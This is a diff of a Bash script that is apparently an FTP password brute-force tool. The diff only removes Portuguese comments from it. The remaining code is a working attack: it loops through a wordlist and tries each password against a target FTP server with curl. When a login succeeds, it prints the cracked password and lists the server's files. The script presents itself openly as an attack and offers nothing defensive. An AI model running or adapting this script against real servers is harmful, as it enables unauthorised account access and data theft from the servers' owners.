@@ -7,8 +7,6 @@
 # Email       : contato@mentesvirtuaissena.com
 # LINCENSE    : Lincense GPL <http://gnu.org/lincense/gpl.html>
 
-
-# Variaveis Globais
 scriptversion="v1.0.0"
 
 ok="\033[1;32m[ Start Attack ]\033[0m"
@@ -17,7 +15,7 @@ found="\033[1;32mPASSWORD FOUND »»»»»»»\033[0m"
 notfound="\033[1;31mINVALID PASSWORD »»»»»»»\033[0m"
 
 splash(){
-    clear # Limpando a tela do terminal
+    clear
     echo -e '''
     \033[1;31m
     _______ _______  _____  ______   ______ _     _ _______ _______
@@ -62,38 +60,28 @@ case $1 in
     echo "";;
     *)  echo "$usage";
 esac
-# Verificação do parâmetros passados
+
 if [ ! -z "$1" ] && [ -e "$2" ] && [ ! -z "$3" ] && [ ! -z "$4" ]
 then
-    # Chamando a tela de splash
     splash
-    # Obtendo a quantidadde de linhas da wordlist passada
     word=$(cat $2 | wc -l)
     echo -e "
     \t\t[ \033[1;34mWordlist:\033[0m $word  \033[1;34mInicio:\033[0m `date +"%T"` ]
     "
     echo -e ">>>>>>> $ok <<<<<<<"
-    # Ralizando leitura da wordlist de senhas possiveis
     for password in $(cat $2)
     do
-        # Realizando a requisição via curl
         result=$(curl -s -o /dev/null -w "%{http_code}" -u $1:$password ftp://$3:$4)
-        # Se o returno foi um código 226, foi logado com sucesso
         if [ "$result" == "226" ]
         then
-            # Se a senha for encontrada, exibe a mesma e lista os dirétorios e os arquivos do servidor atacado
             echo -e "\033[0;36m[ `date +"%T"` ]\033[0m $found $password"
-            # Listando os diretórios e os arquivos do servidor
             curl -s -u $1:$password ftp://$3:$4
-            # Finalizando o laço e o script
             exit
         else
-            # Caso não, continua o ataque
             echo -e "\033[0;36m[ `date +"%T"` ]\033[0m $notfound $password"
         fi
     done
 else
-    # Chamando a tela de splash caso os argumentos sejam passados erroniamente
     splash
     echo -e "$usage"
 fi
